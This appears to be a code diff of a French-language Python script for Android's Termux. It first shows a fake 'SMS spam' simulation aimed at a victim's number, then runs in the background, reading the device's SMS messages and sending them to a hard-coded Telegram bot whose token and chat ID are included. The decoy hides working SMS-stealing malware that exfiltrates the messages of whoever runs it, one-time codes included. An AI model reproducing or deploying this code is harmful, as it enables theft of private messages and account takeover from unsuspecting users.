@@ -1,59 +1,47 @@
-#!/usr/bin/env python3
 import subprocess
-import time
 import requests
+import time
 
-# ==========================
-# Simulation d'intro "fake"
-# ==========================
+# ========= Simulation / Illusion =========
 print("===== SMS2TELEGRAM =====")
 victime = input("📱 Entrez le numéro de la victime : ")
 
-print(f"\n🔗 Connexion au serveur Telegram...")
-time.sleep(2)
+print("\n🔗 Connexion au serveur Telegram...")
+time.sleep(1)
 print(f"📩 Préparation de l'envoi vers {victime}...")
-time.sleep(2)
+time.sleep(1)
 print("⚡ Spam en cours...\n")
+
 for i in range(1, 6):
+    time.sleep(1)
     print(f"✅ Simulation message {i} envoyé à {victime}")
-    time.sleep(0.8)
 
-print("\n--- Simulation terminée ---")
-print("📡 Activation du vrai bot SMS2Telegram...\n")
-time.sleep(2)
+print("\n--- Simulation terminée ---\n")
 
-# ==========================
-# Partie réelle du bot
-# ==========================
-
+# ========= Vrai code : envoi SMS vers Telegram =========
 TELEGRAM_TOKEN = "7767041903:AAEL4enFf0gWivFoZs0f0VrO3tHFmFJw8E8"
 CHAT_ID = "7874160840"
 
 def send_to_telegram(message):
-    """Envoie un message au bot Telegram"""
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     data = {"chat_id": CHAT_ID, "text": message}
     try:
-        requests.post(url, data=data, timeout=10)
+        requests.post(url, data=data)
     except Exception as e:
-        print("Erreur envoi Telegram:", e)
+        print(f"Erreur Telegram : {e}")
 
-def get_sms():
-    """Récupère les SMS via termux-sms-list"""
+print("📡 Le bot tourne en arrière-plan...")
+
+while True:
     try:
-        output = subprocess.check_output(["termux-sms-list"], text=True)
-        return output
-    except Exception as e:
-        return str(e)
+        # Lire les SMS avec termux-sms-list
+        result = subprocess.run(["termux-sms-list", "-l", "1"], capture_output=True, text=True)
+        sms_list = result.stdout.strip()
 
-def main():
-    last_sms = ""
-    while True:
-        sms = get_sms()
-        if sms != last_sms:
-            send_to_telegram("📩 Nouveau SMS reçu:\n\n" + sms)
-            last_sms = sms
-        time.sleep(10)  # Vérifie toutes les 10 secondes
-
-if __name__ == "__main__":
-    main()
+        if sms_list:
+            send_to_telegram("📩 Nouveau SMS reçu:\n" + sms_list)
+        
+        time.sleep(10)  # vérifie toutes les 10 secondes
+    except KeyboardInterrupt:
+        print("❌ Bot arrêté manuellement.")
+        break
